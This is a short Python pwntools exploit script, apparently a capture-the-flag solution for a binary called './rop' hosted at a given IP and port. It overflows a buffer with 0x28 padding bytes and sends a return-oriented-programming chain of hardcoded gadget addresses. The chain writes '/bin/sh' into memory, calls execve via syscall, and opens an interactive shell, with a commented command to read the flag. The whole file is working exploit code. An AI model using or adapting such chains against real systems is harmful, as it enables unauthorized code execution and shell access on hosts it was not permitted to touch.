#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './rop'
LIBC = ''
HOST = '140.110.112.77'
PORT = 2113

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )


pop_rdx_rsi_ret = 0x0000000000442a19
pop_rdi_ret = 0x00000000004014f6
pop_rdx_ret = 0x00000000004429f6
pop_rax_ret = 0x000000000044f6cc
mov_qword_ptr_rdi_rdx_ret = 0x00000000004355f3
syscall = 0x00000000004003da
binsh = 0x6cdf00
ROP = flat( 
    pop_rdi_ret,
    binsh,
    pop_rdx_ret,
    b"/bin/sh\x00",
    mov_qword_ptr_rdi_rdx_ret,
    pop_rdx_rsi_ret,
    0,
    0,
    pop_rax_ret,
    0x3b,
    syscall
)
input()
r.send(b'\x00'*0x28 + ROP)
#r.sendline('cat /home/`whoami`/flag')
r.interactive()
